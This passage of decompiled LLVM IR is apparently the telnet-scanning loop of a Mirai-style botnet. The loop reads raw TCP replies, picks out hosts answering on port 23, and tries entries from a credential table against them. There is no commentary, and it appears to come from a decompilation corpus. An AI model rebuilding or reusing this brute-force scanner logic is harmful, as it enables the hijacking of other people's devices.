  %v3_169e0 = load i32, i32* %i_-148, align 4
  %v1_169e4 = add i32 %v3_169e0, 1
  store i32 %v1_169e4, i32* %i_-148, align 4
  %v7_169fc = icmp slt i32 %v1_169e4, 1024
  br i1 %v7_169fc, label %dec_label_pc_16888, label %dec_label_pc_16a00

dec_label_pc_16a00:                               ; preds = %dec_label_pc_16888, %dec_label_pc_1684c
  %mfd_rd_-124.1 = phi i32 [ %mfd_rd_-124.0, %dec_label_pc_1684c ], [ %v2_16864, %dec_label_pc_16888 ]
  br label %dec_label_pc_16a08

dec_label_pc_16a08:                               ; preds = %dec_label_pc_16b60, %dec_label_pc_16b4c, %dec_label_pc_16b38, %dec_label_pc_16afc, %dec_label_pc_16ae0, %dec_label_pc_16ad0, %dec_label_pc_16ab8, %dec_label_pc_16b24, %dec_label_pc_16b10, %dec_label_pc_16aac, %dec_label_pc_16c38, %dec_label_pc_16a00
  %last_spew_-128.0 = phi i32 [ 0, %dec_label_pc_16a00 ], [ %last_spew_-128.0, %dec_label_pc_16aac ], [ %last_spew_-128.0, %dec_label_pc_16b10 ], [ %last_spew_-128.0, %dec_label_pc_16b24 ], [ %last_spew_-128.1, %dec_label_pc_16c38 ], [ %last_spew_-128.0, %dec_label_pc_16b60 ], [ %last_spew_-128.0, %dec_label_pc_16b4c ], [ %last_spew_-128.0, %dec_label_pc_16b38 ], [ %last_spew_-128.0, %dec_label_pc_16afc ], [ %last_spew_-128.0, %dec_label_pc_16ae0 ], [ %last_spew_-128.0, %dec_label_pc_16ad0 ], [ %last_spew_-128.0, %dec_label_pc_16ab8 ]
  %v0_16a24 = call i32 @__GI___errno_location()
  %v2_16a30 = inttoptr i32 %v0_16a24 to i32*
  store i32 0, i32* %v2_16a30, align 4
  %v2_16a38 = load i32, i32* @rsck, align 4
  %v6_16a6c = call i32 @__libc_recvfrom(i32 %v2_16a38, i32 %v2_16a10, i32 1514, i32 16384, i32 0, i32 0)
  %tmp118 = icmp slt i32 %v6_16a6c, 1
  br i1 %tmp118, label %dec_label_pc_16c78.lr.ph, label %dec_label_pc_16a84

dec_label_pc_16a84:                               ; preds = %dec_label_pc_16a08
  %v0_16a84 = call i32 @__GI___errno_location()
  %v1_16a8c = inttoptr i32 %v0_16a84 to i32*
  %v2_16a8c = load i32, i32* %v1_16a8c, align 4
  %v7_16a90 = icmp eq i32 %v2_16a8c, 11
  br i1 %v7_16a90, label %dec_label_pc_16c78.lr.ph, label %dec_label_pc_16a98

dec_label_pc_16a98:                               ; preds = %dec_label_pc_16a84
  %v0_16a98 = call i32 @__GI___errno_location()
  %v1_16aa0 = inttoptr i32 %v0_16a98 to i32*
  %v2_16aa0 = load i32, i32* %v1_16aa0, align 4
  %v7_16aa4 = icmp eq i32 %v2_16aa0, 11
  br i1 %v7_16aa4, label %dec_label_pc_16c78.lr.ph, label %dec_label_pc_16aac

dec_label_pc_16aac:                               ; preds = %dec_label_pc_16a98
  %tmp136 = icmp ult i32 %v6_16a6c, 40
  br i1 %tmp136, label %dec_label_pc_16a08, label %dec_label_pc_16ab8

dec_label_pc_16ab8:                               ; preds = %dec_label_pc_16aac
  %v3_16abc = load i32, i32* %v2_16abc, align 4
  %v2_16ac4 = load i32, i32* @LOCAL_ADDR, align 4
  %v9_16ac8 = icmp eq i32 %v3_16abc, %v2_16ac4
  br i1 %v9_16ac8, label %dec_label_pc_16ad0, label %dec_label_pc_16a08

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16ab8
  %v3_16ad4 = load i8, i8* %v2_16ad4, align 1
  %v7_16ad8 = icmp eq i8 %v3_16ad4, 6
  br i1 %v7_16ad8, label %dec_label_pc_16ae0, label %dec_label_pc_16a08

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16ad0
  %v2_16ae4 = load i16, i16* %v1_16ae4, align 2
  %v3_16ae4 = zext i16 %v2_16ae4 to i32
  store i32 %v3_16ae4, i32* @r4, align 4
  %v1_16aec = call i32 @__GI_htons(i32 23)
  %v0_16af4 = load i32, i32* @r4, align 4
  %v9_16af4 = icmp eq i32 %v0_16af4, %v1_16aec
  br i1 %v9_16af4, label %dec_label_pc_16afc, label %dec_label_pc_16a08

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16ae0
  %v3_16b00 = load i16, i16* %v2_16b00, align 2
  %v9_16b08 = icmp eq i16 %v1_1642c.le, %v3_16b00
  br i1 %v9_16b08, label %dec_label_pc_16b10, label %dec_label_pc_16a08

dec_label_pc_16b10:                               ; preds = %dec_label_pc_16afc
  %v3_16b14 = load i8, i8* %v2_16b14, align 1
  %v1_16b18 = and i8 %v3_16b14, 2
  %v2_16b1c = icmp eq i8 %v1_16b18, 0
  br i1 %v2_16b1c, label %dec_label_pc_16a08, label %dec_label_pc_16b24

dec_label_pc_16b24:                               ; preds = %dec_label_pc_16b10
  %v3_16b28 = load i8, i8* %v2_16b14, align 1
  %v1_16b2c = and i8 %v3_16b28, 16
  %v2_16b30 = icmp eq i8 %v1_16b2c, 0
  br i1 %v2_16b30, label %dec_label_pc_16a08, label %dec_label_pc_16b38

dec_label_pc_16b38:                               ; preds = %dec_label_pc_16b24
  %v3_16b3c = load i8, i8* %v2_16b14, align 1
  %v1_16b40 = and i8 %v3_16b3c, 4
  %v2_16b44 = icmp eq i8 %v1_16b40, 0
  br i1 %v2_16b44, label %dec_label_pc_16b4c, label %dec_label_pc_16a08

dec_label_pc_16b4c:                               ; preds = %dec_label_pc_16b38
  %v3_16b50 = load i8, i8* %v2_16b14, align 1
  %tmp137 = urem i8 %v3_16b50, 2
  %v2_16b58 = icmp eq i8 %tmp137, 0
  br i1 %v2_16b58, label %dec_label_pc_16b60, label %dec_label_pc_16a08

dec_label_pc_16b60:                               ; preds = %dec_label_pc_16b4c
  %v3_16b64 = load i32, i32* %v2_16b64, align 4
  %v1_16b6c = call i32 @__GI_ntohl(i32 %v3_16b64)
  %v1_16b74 = add i32 %v1_16b6c, -1
  %v1_16b7c = call i32 @__GI_htonl(i32 %v1_16b74)
  %v3_16b88 = load i32, i32* %v2_16b88, align 4
  %v9_16b8c = icmp eq i32 %v1_16b7c, %v3_16b88
  br i1 %v9_16b8c, label %dec_label_pc_16b94, label %dec_label_pc_16a08

dec_label_pc_16b94:                               ; preds = %dec_label_pc_16b60
  %v7_16c2831 = icmp slt i32 %last_spew_-128.0, 256
  br i1 %v7_16c2831, label %dec_label_pc_16ba8.lr.ph, label %dec_label_pc_16c2c

dec_label_pc_16ba8.lr.ph:                         ; preds = %dec_label_pc_16b94
  %v2_16bc0.pre = load i32, i32* @conn_table, align 4
  br label %dec_label_pc_16ba8

dec_label_pc_16ba8:                               ; preds = %dec_label_pc_16ba8.lr.ph, %dec_label_pc_16c14
  %storemerge1832 = phi i32 [ %last_spew_-128.0, %dec_label_pc_16ba8.lr.ph ], [ %v1_16c18, %dec_label_pc_16c14 ]
  %v2_16bb4 = mul i32 %storemerge1832, 288
  %v2_16bc4 = add i32 %v2_16bb4, %v2_16bc0.pre
  %v1_16bc8 = add i32 %v2_16bc4, 12
  %v2_16bc8 = inttoptr i32 %v1_16bc8 to i32*
  %v3_16bc8 = load i32, i32* %v2_16bc8, align 4
  %v2_16bcc = icmp eq i32 %v3_16bc8, 0
  br i1 %v2_16bcc, label %dec_label_pc_16bd4, label %dec_label_pc_16c14

dec_label_pc_16bd4:                               ; preds = %dec_label_pc_16ba8
  store i32 %storemerge1832, i32* @r1, align 4
  %v5_16c0c = mul i32 %storemerge1832, 4
  %v6_16c0c = add i32 %v5_16c0c, ptrtoint ([256 x i32]* @authindex_table to i32)
  %v7_16c0c = inttoptr i32 %v6_16c0c to i32*
  store i32 0, i32* %v7_16c0c, align 4
  br label %dec_label_pc_16c2c

dec_label_pc_16c14:                               ; preds = %dec_label_pc_16ba8
  %v1_16c18 = add nsw i32 %storemerge1832, 1
  %v7_16c28 = icmp slt i32 %v1_16c18, 256
  br i1 %v7_16c28, label %dec_label_pc_16ba8, label %dec_label_pc_16c20.dec_label_pc_16c2c.loopexit_crit_edge

dec_label_pc_16c20.dec_label_pc_16c2c.loopexit_crit_edge: ; preds = %dec_label_pc_16c14
  br label %dec_label_pc_16c2c

dec_label_pc_16c2c:                               ; preds = %dec_label_pc_16b94, %dec_label_pc_16c20.dec_label_pc_16c2c.loopexit_crit_edge, %dec_label_pc_16bd4
  %conn_-88.0 = phi i32 [ %v2_16bc4, %dec_label_pc_16bd4 ], [ 0, %dec_label_pc_16c20.dec_label_pc_16c2c.loopexit_crit_edge ], [ 0, %dec_label_pc_16b94 ]
  %last_spew_-128.1 = phi i32 [ %storemerge1832, %dec_label_pc_16bd4 ], [ %last_spew_-128.0, %dec_label_pc_16c20.dec_label_pc_16c2c.loopexit_crit_edge ], [ %last_spew_-128.0, %dec_label_pc_16b94 ]
  %v2_16c30 = icmp eq i32 %conn_-88.0, 0
  br i1 %v2_16c30, label %dec_label_pc_16c78.lr.ph, label %dec_label_pc_16c38

dec_label_pc_16c38:                               ; preds = %dec_label_pc_16c2c
  %v3_16c3c = load i32, i32* %v2_16b88, align 4
  %v2_16c44 = add i32 %conn_-88.0, 16
  %v3_16c44 = inttoptr i32 %v2_16c44 to i32*
  store i32 %v3_16c3c, i32* %v3_16c44, align 4
  %v2_16c4c = load i16, i16* %v1_16ae4, align 2
  %v3_16c54 = add i32 %conn_-88.0, 20
  %v4_16c54 = inttoptr i32 %v3_16c54 to i16*
  store i16 %v2_16c4c, i16* %v4_16c54, align 2
  call void @setup_connection(i32 %conn_-88.0)
  br label %dec_label_pc_16a08

dec_label_pc_16c78.lr.ph:                         ; preds = %dec_label_pc_16a08, %dec_label_pc_16a84, %dec_label_pc_16a98, %dec_label_pc_16c2c
  br label %dec_label_pc_16c78

dec_label_pc_16c78:                               ; preds = %dec_label_pc_16c78.lr.ph, %dec_label_pc_16c78
  %storemerge1936 = phi i32 [ 0, %dec_label_pc_16c78.lr.ph ], [ %v1_16c8c, %dec_label_pc_16c78 ]
  %v5_16c84 = mul i32 %storemerge1936, 4
  %v6_16c84 = add i32 %v5_16c84, %v2_16c64
  %v7_16c84 = inttoptr i32 %v6_16c84 to i32*
  store i32 0, i32* %v7_16c84, align 4
  %v1_16c8c = add i32 %storemerge1936, 1
  %tmp138 = icmp ult i32 %v1_16c8c, 32
  br i1 %tmp138, label %dec_label_pc_16c78, label %dec_label_pc_16cb4.lr.ph

dec_label_pc_16cb4.lr.ph:                         ; preds = %dec_label_pc_16c78
  br label %dec_label_pc_16cb4

dec_label_pc_16cb4:                               ; preds = %dec_label_pc_16cb4.lr.ph, %dec_label_pc_16cb4
  %v4_16cd0132 = phi i32 [ 0, %dec_label_pc_16cb4.lr.ph ], [ %v1_16cc8, %dec_label_pc_16cb4 ]
  store i32 %v4_16cd0132, i32* @r1, align 4
  %v5_16cc0 = mul i32 %v4_16cd0132, 4
  %v6_16cc0 = add i32 %v5_16cc0, %v2_16ca0
  %v7_16cc0 = inttoptr i32 %v6_16cc0 to i32*
  store i32 0, i32* %v7_16cc0, align 4
  %v1_16cc8 = add i32 %v4_16cd0132, 1
  %v4_16ccc = inttoptr i32 %v1_16cc8 to %anon_struct_4*
  %v7_16cd4 = icmp eq %anon_struct_4* %v4_16ccc, inttoptr (i32 31 to %anon_struct_4*)
  %v2_16cd8 = icmp ule %anon_struct_4* %v4_16ccc, inttoptr (i32 30 to %anon_struct_4*)
  %v3_16cd8 = or i1 %v7_16cd4, %v2_16cd8
  br i1 %v3_16cd8, label %dec_label_pc_16cb4, label %dec_label_pc_16f30.preheader

dec_label_pc_16f30.preheader:                     ; preds = %dec_label_pc_16cb4
  store i32 0, i32* %i_-148, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16ce8:                               ; preds = %dec_label_pc_16f30.preheader, %dec_label_pc_16f24
  %v3_16ce8 = phi i32 [ 0, %dec_label_pc_16f30.preheader ], [ %v1_16f28, %dec_label_pc_16f24 ]
  %mfd_wr_-120.138 = phi i32 [ 0, %dec_label_pc_16f30.preheader ], [ %v3_16f58, %dec_label_pc_16f24 ]
  %nfds_-116.137 = phi i32 [ 0, %dec_label_pc_16f30.preheader ], [ %nfds_-116.0, %dec_label_pc_16f24 ]
  %v2_16cf4 = mul i32 %v3_16ce8, 288
  %v2_16d00 = load i32, i32* @conn_table, align 4
  %v2_16d04 = add i32 %v2_16d00, %v2_16cf4
  %v1_16d10 = add i32 %v2_16d04, 12
  %v2_16d10 = inttoptr i32 %v1_16d10 to i32*
  %v3_16d10 = load i32, i32* %v2_16d10, align 4
  %tmp139 = or i32 %v3_16d10, 1
  %tmp140 = icmp eq i32 %tmp139, 1
  br i1 %tmp140, label %dec_label_pc_16d28, label %dec_label_pc_16d1c

dec_label_pc_16d1c:                               ; preds = %dec_label_pc_16ce8
  br label %dec_label_pc_16d30

dec_label_pc_16d28:                               ; preds = %dec_label_pc_16ce8
  store i32 5, i32* @r1, align 4
  br label %dec_label_pc_16d30

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16d1c, %dec_label_pc_16d28
  %storemerge9 = phi i32 [ 5, %dec_label_pc_16d28 ], [ 30, %dec_label_pc_16d1c ]
  %v3_16d3c = load i32, i32* %v2_16d10, align 4
  %v2_16d40 = icmp eq i32 %v3_16d3c, 0
  br i1 %v2_16d40, label %dec_label_pc_16df8, label %dec_label_pc_16d48

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16d30
  %v2_16d4c = load i32, i32* @fake_time, align 4
  %v1_16d54 = add i32 %v2_16d04, 8
  %v2_16d54 = inttoptr i32 %v1_16d54 to i32*
  %v3_16d54 = load i32, i32* %v2_16d54, align 4
  %v2_16d58 = sub i32 %v2_16d4c, %v3_16d54
  %tmp141 = icmp ugt i32 %v2_16d58, %storemerge9
  br i1 %tmp141, label %dec_label_pc_16d68, label %dec_label_pc_16df8

dec_label_pc_16d68:                               ; preds = %dec_label_pc_16d48
  %v1_16d6c = add i32 %v2_16d04, 4
  %v2_16d6c = inttoptr i32 %v1_16d6c to i32*
  %v3_16d6c = load i32, i32* %v2_16d6c, align 4
  %v1_16d74 = call i32 @__GI___libc_close(i32 %v3_16d6c)
  store i32 -1, i32* %v2_16d6c, align 4
  %v3_16d88 = load i32, i32* %v2_16d10, align 4
  %tmp142 = icmp ult i32 %v3_16d88, 3
  br i1 %tmp142, label %dec_label_pc_16ddc, label %dec_label_pc_16d94

dec_label_pc_16d94:                               ; preds = %dec_label_pc_16d68
  %v3_16d94 = load i32, i32* %i_-148, align 4
  %v4_16d9c = mul i32 %v3_16d94, 4
  %v5_16d9c = add i32 %v4_16d9c, ptrtoint ([256 x i32]* @authindex_table to i32)
  %v6_16d9c = inttoptr i32 %v5_16d9c to i32*
  %v7_16d9c = load i32, i32* %v6_16d9c, align 4
  %v2_16da4 = load i32, i32* @auth_table_len, align 4
  %v1_16da8 = add i32 %v2_16da4, -1
  %v7_16db0 = icmp sgt i32 %v7_16d9c, %v1_16da8
  br i1 %v7_16db0, label %dec_label_pc_16db4, label %dec_label_pc_16dd0

dec_label_pc_16db4:                               ; preds = %dec_label_pc_16d94
  %v3_16dbc = add i32 %v2_16d04, 284
  %v4_16dbc = inttoptr i32 %v3_16dbc to i8*
  store i8 0, i8* %v4_16dbc, align 1
  store i32 0, i32* %v2_16d10, align 4
  br label %dec_label_pc_16f24

dec_label_pc_16dd0:                               ; preds = %dec_label_pc_16d94
  call void @setup_connection(i32 %v2_16d04)
  br label %dec_label_pc_16f24

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16d68
  %v3_16de4 = add i32 %v2_16d04, 284
  %v4_16de4 = inttoptr i32 %v3_16de4 to i8*
  store i8 0, i8* %v4_16de4, align 1
  store i32 0, i32* %v2_16d10, align 4
  br label %dec_label_pc_16f24

dec_label_pc_16df8:                               ; preds = %dec_label_pc_16d48, %dec_label_pc_16d30
  %v3_16dfc = load i32, i32* %v2_16d10, align 4
  %v7_16e00 = icmp eq i32 %v3_16dfc, 1
  br i1 %v7_16e00, label %dec_label_pc_16e08, label %dec_label_pc_16e90

dec_label_pc_16e08:                               ; preds = %dec_label_pc_16df8
  %v1_16e0c = add i32 %v2_16d04, 4
  %v2_16e0c = inttoptr i32 %v1_16e0c to i32*
  %v3_16e0c = load i32, i32* %v2_16e0c, align 4
  %v3_16e10 = udiv i32 %v3_16e0c, 32
  %v3_16e24 = mul nuw nsw i32 %v3_16e10, 4
  %v2_16e2c = add i32 %v3_16e24, %v2_16e28
  %v2_16e30 = add i32 %v2_16e2c, -432
  %v1_16e34 = inttoptr i32 %v2_16e30 to i32*
  %v2_16e34 = load i32, i32* %v1_16e34, align 4
  %v3_16e3c = load i32, i32* %v2_16e0c, align 4
  %v1_16e40 = urem i32 %v3_16e3c, 32
  %v6_16e48 = shl i32 1, %v1_16e40
  %v2_16e4c = or i32 %v6_16e48, %v2_16e34
  store i32 %v2_16e4c, i32* @r1, align 4
  store i32 %v2_16e4c, i32* %v1_16e34, align 4
  %v3_16e70 = load i32, i32* %v2_16e0c, align 4
  %v7_16e7c = icmp sgt i32 %v3_16e70, %nfds_-116.137
  br i1 %v7_16e7c, label %dec_label_pc_16e80, label %dec_label_pc_16f24

dec_label_pc_16e80:                               ; preds = %dec_label_pc_16e08
  %v3_16e84 = load i32, i32* %v2_16e0c, align 4
  br label %dec_label_pc_16f24

dec_label_pc_16e90:                               ; preds = %dec_label_pc_16df8
  %v3_16e94 = load i32, i32* %v2_16d10, align 4
  %v2_16e98 = icmp eq i32 %v3_16e94, 0
  br i1 %v2_16e98, label %dec_label_pc_16f24, label %dec_label_pc_16ea0

dec_label_pc_16ea0:                               ; preds = %dec_label_pc_16e90
  %v1_16ea4 = add i32 %v2_16d04, 4
  %v2_16ea4 = inttoptr i32 %v1_16ea4 to i32*
  %v3_16ea4 = load i32, i32* %v2_16ea4, align 4
  %v3_16ea8 = udiv i32 %v3_16ea4, 32
  %v3_16ebc = mul nuw nsw i32 %v3_16ea8, 4
  %v2_16ec4 = add i32 %v3_16ebc, %v2_16e28
  %v2_16ec8 = add i32 %v2_16ec4, -304
  %v1_16ecc = inttoptr i32 %v2_16ec8 to i32*
  %v2_16ecc = load i32, i32* %v1_16ecc, align 4
  %v3_16ed4 = load i32, i32* %v2_16ea4, align 4
  %v1_16ed8 = urem i32 %v3_16ed4, 32
  %v6_16ee0 = shl i32 1, %v1_16ed8
  %v2_16ee4 = or i32 %v6_16ee0, %v2_16ecc
  store i32 %v2_16ee4, i32* @r1, align 4
  store i32 %v2_16ee4, i32* %v1_16ecc, align 4
  %v3_16f08 = load i32, i32* %v2_16ea4, align 4
  %v7_16f14 = icmp sgt i32 %v3_16f08, %mfd_wr_-120.138
  br i1 %v7_16f14, label %dec_label_pc_16f18, label %dec_label_pc_16f24

dec_label_pc_16f18:                               ; preds = %dec_label_pc_16ea0
  %v3_16f1c = load i32, i32* %v2_16ea4, align 4
  br label %dec_label_pc_16f24

dec_label_pc_16f24:                               ; preds = %dec_label_pc_16ea0, %dec_label_pc_16e08, %dec_label_pc_16e90, %dec_label_pc_16e80, %dec_label_pc_16ddc, %dec_label_pc_16dd0, %dec_label_pc_16db4, %dec_label_pc_16f18
  %nfds_-116.0 = phi i32 [ %v3_16e84, %dec_label_pc_16e80 ], [ %nfds_-116.137, %dec_label_pc_16e08 ], [ %nfds_-116.137, %dec_label_pc_16e90 ], [ %nfds_-116.137, %dec_label_pc_16f18 ], [ %nfds_-116.137, %dec_label_pc_16ea0 ], [ %nfds_-116.137, %dec_label_pc_16ddc ], [ %nfds_-116.137, %dec_label_pc_16db4 ], [ %nfds_-116.137, %dec_label_pc_16dd0 ]
  %v3_16f58 = phi i32 [ %mfd_wr_-120.138, %dec_label_pc_16e80 ], [ %mfd_wr_-120.138, %dec_label_pc_16e08 ], [ %mfd_wr_-120.138, %dec_label_pc_16e90 ], [ %v3_16f1c, %dec_label_pc_16f18 ], [ %mfd_wr_-120.138, %dec_label_pc_16ea0 ], [ %mfd_wr_-120.138, %dec_label_pc_16ddc ], [ %mfd_wr_-120.138, %dec_label_pc_16db4 ], [ %mfd_wr_-120.138, %dec_label_pc_16dd0 ]
  %v3_16f24 = load i32, i32* %i_-148, align 4
  %v1_16f28 = add i32 %v3_16f24, 1
  store i32 %v1_16f28, i32* %i_-148, align 4
  %v7_16f38 = icmp slt i32 %v1_16f28, 256
  br i1 %v7_16f38, label %dec_label_pc_16ce8, label %dec_label_pc_16f3c

dec_label_pc_16f3c:                               ; preds = %dec_label_pc_16f24
  store i32 1, i32* %v4_16f48, align 8
  %v2_16f54 = sub i32 %v3_16f58, %nfds_-116.0
  %v4_16f54 = xor i32 %v3_16f58, %nfds_-116.0
  %v5_16f54 = xor i32 %v2_16f54, %v3_16f58
  %v6_16f54 = and i32 %v5_16f54, %v4_16f54
  %v7_16f54 = icmp slt i32 %v6_16f54, 0
  %v8_16f54 = icmp slt i32 %v2_16f54, 0
  %v2_16f58 = xor i1 %v8_16f54, %v7_16f54
  br i1 %v2_16f58, label %bb120, label %bb

bb:                                               ; preds = %dec_label_pc_16f3c
  br label %bb120

bb120:                                            ; preds = %dec_label_pc_16f3c, %bb
  %v0_16f60 = phi i32 [ %nfds_-116.0, %dec_label_pc_16f3c ], [ %v3_16f58, %bb ]
  %v1_16f60 = add i32 %v0_16f60, 1
  %v5_16f80 = call i32 @__libc_select(i32 %v1_16f60, i32 %v2_16c64, i32 %v2_16ca0, i32 0, i32 %v2_16f6c)
  %v2_16f90 = call i32 @__GI_time(i32* null)
  store i32 %v2_16f90, i32* @fake_time, align 4
  store i32 0, i32* %i_-148, align 4
  br label %dec_label_pc_16fb0

dec_label_pc_16fb0:                               ; preds = %bb120, %dec_label_pc_179a0
  %v3_16fb0 = phi i32 [ 0, %bb120 ], [ %v1_179a4, %dec_label_pc_179a0 ]
  %v2_16fbc = mul i32 %v3_16fb0, 288
  %v2_16fc8 = load i32, i32* @conn_table, align 4
  %v2_16fcc = add i32 %v2_16fc8, %v2_16fbc
  %v1_16fd8 = add i32 %v2_16fcc, 4
  %v2_16fd8 = inttoptr i32 %v1_16fd8 to i32*
  %v3_16fd8 = load i32, i32* %v2_16fd8, align 4
  %v7_16fdc = icmp eq i32 %v3_16fd8, -1
  br i1 %v7_16fdc, label %dec_label_pc_179a0, label %dec_label_pc_16fe4

dec_label_pc_16fe4:                               ; preds = %dec_label_pc_16fb0
  %v3_16fe8 = load i32, i32* %v2_16fd8, align 4
  %v3_16fec = udiv i32 %v3_16fe8, 32
  %v3_16ff8 = mul nuw nsw i32 %v3_16fec, 4
  %v2_17000 = add i32 %v3_16ff8, %v2_16e28
  %v2_17004 = add i32 %v2_17000, -432
  %v1_17008 = inttoptr i32 %v2_17004 to i32*
  %v2_17008 = load i32, i32* %v1_17008, align 4
  %v3_17010 = load i32, i32* %v2_16fd8, align 4
  %v1_17014 = urem i32 %v3_17010, 32
  %v6_170186 = lshr i32 %v2_17008, %v1_17014
  %v1_17020 = urem i32 %v6_170186, 2
  %v2_17024 = icmp eq i32 %v1_17020, 0
  br i1 %v2_17024, label %dec_label_pc_17238, label %dec_label_pc_1702c

dec_label_pc_1702c:                               ; preds = %dec_label_pc_16fe4
  store i32 0, i32* %paddr_-176, align 4
  store i32 4, i32* %err_-180, align 4
  %v3_17048 = load i32, i32* %v2_16fd8, align 4
  store i32 1, i32* @r1, align 4
  %v5_17068 = call i32 @getsockopt(i32 %v3_17048, i32 1, i32 4, i32 %v2_1704c, i32 %v2_17050)
  %v3_17074 = load i32, i32* %paddr_-176, align 4
  %v2_17078 = icmp eq i32 %v3_17074, 0
  br i1 %v2_17078, label %dec_label_pc_17080, label %dec_label_pc_17138

dec_label_pc_17080:                               ; preds = %dec_label_pc_1702c
  %v2_17084 = icmp eq i32 %v5_17068, 0
  br i1 %v2_17084, label %dec_label_pc_1708c, label %dec_label_pc_17138

dec_label_pc_1708c:                               ; preds = %dec_label_pc_17080
  %v2_17094 = add i32 %v2_16fcc, 12
  %v3_17094 = inttoptr i32 %v2_17094 to i32*
  store i32 2, i32* %v3_17094, align 4
  %v3_17098 = load i32, i32* %i_-148, align 4
  %v4_170a0 = mul i32 %v3_17098, 4
  %v5_170a0 = add i32 %v4_170a0, ptrtoint ([256 x i32]* @authindex_table to i32)
  %v6_170a0 = inttoptr i32 %v5_170a0 to i32*
  %v7_170a0 = load i32, i32* %v6_170a0, align 4
  %v2_170a8 = load i32, i32* @auth_table_len, align 4
  %v1_170ac = add i32 %v2_170a8, -1
  %v7_170b4 = icmp sgt i32 %v7_170a0, %v1_170ac
  br i1 %v7_170b4, label %dec_label_pc_170b8, label %dec_label_pc_170f0

dec_label_pc_170b8:                               ; preds = %dec_label_pc_1708c
  %v3_170bc = load i32, i32* %v2_16fd8, align 4
  %v1_170c4 = call i32 @__GI___libc_close(i32 %v3_170bc)
  store i32 -1, i32* %v2_16fd8, align 4
  %v3_170dc = add i32 %v2_16fcc, 284
  %v4_170dc = inttoptr i32 %v3_170dc to i8*
  store i8 0, i8* %v4_170dc, align 1
  store i32 0, i32* %v3_17094, align 4
  br label %dec_label_pc_179a0

dec_label_pc_170f0:                               ; preds = %dec_label_pc_1708c
  %v7_170f8 = load i32, i32* %v6_170a0, align 4
  %v2_17100 = call i32 @get_auth_entry(i32 %v7_170f8)
  %v2_1710c = inttoptr i32 %v2_16fcc to i32*
  store i32 %v2_17100, i32* %v2_1710c, align 4
  %v2_17118 = add i32 %v2_16fcc, 24
  %v3_17118 = inttoptr i32 %v2_17118 to i32*
  store i32 0, i32* %v3_17118, align 4
  %v3_1711c = load i32, i32* %i_-148, align 4
  %v4_17124 = mul i32 %v3_1711c, 4
  %v5_17124 = add i32 %v4_17124, ptrtoint ([256 x i32]* @authindex_table to i32)
  %v6_17124 = inttoptr i32 %v5_17124 to i32*
  %v7_17124 = load i32, i32* %v6_17124, align 4
  %v1_17128 = add i32 %v7_17124, 1
  store i32 %v1_17128, i32* %v6_17124, align 4
  br label %dec_label_pc_17238

dec_label_pc_17138:                               ; preds = %dec_label_pc_17080, %dec_label_pc_1702c
  %v3_1713c = load i32, i32* %v2_16fd8, align 4
  %v1_17144 = call i32 @__GI___libc_close(i32 %v3_1713c)
  store i32 -1, i32* %v2_16fd8, align 4
  %v3_1715c = add i32 %v2_16fcc, 284
  %v4_1715c = inttoptr i32 %v3_1715c to i8*
  store i8 0, i8* %v4_1715c, align 1
  %v2_17168 = add i32 %v2_16fcc, 12
  %v3_17168 = inttoptr i32 %v2_17168 to i32*
  store i32 0, i32* %v3_17168, align 4
  br label %dec_label_pc_179a0

dec_label_pc_17238:                               ; preds = %dec_label_pc_16fe4, %dec_label_pc_170f0
  %v3_1723c = load i32, i32* %v2_16fd8, align 4
  %v3_17240 = udiv i32 %v3_1723c, 32
  %v3_1724c = mul nuw nsw i32 %v3_17240, 4
  %v2_17254 = add i32 %v3_1724c, %v2_16e28
  %v2_17258 = add i32 %v2_17254, -304
  %v1_1725c = inttoptr i32 %v2_17258 to i32*
  %v2_1725c = load i32, i32* %v1_1725c, align 4
  %v3_17264 = load i32, i32* %v2_16fd8, align 4
  %v1_17268 = urem i32 %v3_17264, 32
  %v6_1726c7 = lshr i32 %v2_1725c, %v1_17268
  %v1_17274 = urem i32 %v6_1726c7, 2
  %v2_17278 = icmp eq i32 %v1_17274, 0
  br i1 %v2_17278, label %dec_label_pc_179a0, label %dec_label_pc_17280.preheader

dec_label_pc_17280.preheader:                     ; preds = %dec_label_pc_17238
  %v1_17284 = add i32 %v2_16fcc, 12
  %v2_17284 = inttoptr i32 %v1_17284 to i32*
  %v3_1728439 = load i32, i32* %v2_17284, align 4
  %v2_1728841 = icmp eq i32 %v3_1728439, 0
  br i1 %v2_1728841, label %dec_label_pc_179a0, label %dec_label_pc_17290.lr.ph

dec_label_pc_17290.lr.ph:                         ; preds = %dec_label_pc_17280.preheader
  %v1_17294 = add i32 %v2_16fcc, 24
  %v2_17294 = inttoptr i32 %v1_17294 to i32*
  %v1_172a4 = add i32 %v2_16fcc, 28
  %v1_172b0 = add i32 %v2_16fcc, 92
  %v2_17410 = add i32 %v2_16fcc, 8
  %v3_17410 = inttoptr i32 %v2_17410 to i32*
  %v1_174ac = inttoptr i32 %v2_16fcc to i32*
  %v3_178a4 = add i32 %v2_16fcc, 284
  %v4_178a4 = inttoptr i32 %v3_178a4 to i8*
  %v1_178d4 = add i32 %v2_16fcc, 16
  %v2_178d4 = inttoptr i32 %v1_178d4 to i32*
  %v1_178dc = add i32 %v2_16fcc, 20
  %v2_178dc = inttoptr i32 %v1_178dc to i16*
  br label %dec_label_pc_17290

dec_label_pc_17280.loopexit:                      ; preds = %dec_label_pc_17928
  %v3_17284 = load i32, i32* %v2_17284, align 4
  %v2_17288 = icmp eq i32 %v3_17284, 0
  br i1 %v2_17288, label %dec_label_pc_179a0, label %dec_label_pc_17290

dec_label_pc_17290:                               ; preds = %dec_label_pc_17290.lr.ph, %dec_label_pc_17280.loopexit
  %v3_17294 = load i32, i32* %v2_17294, align 4
  %v7_17298 = icmp eq i32 %v3_17294, 256
  br i1 %v7_17298, label %dec_label_pc_172a0, label %dec_label_pc_172d8

dec_label_pc_172a0:                               ; preds = %dec_label_pc_17290
  store i32 %v1_172b0, i32* @r3, align 4
  store i32 %v1_172a4, i32* @r0, align 4
  store i32 %v1_172b0, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_172c0 = call i32 @memmove(i32 %v1_172a4, i32 %v1_172b0, i32 192)
  %v3_172c8 = load i32, i32* %v2_17294, align 4
  %v1_172cc = add i32 %v3_172c8, -64
  store i32 %v1_172cc, i32* %v2_17294, align 4
  br label %dec_label_pc_172d8

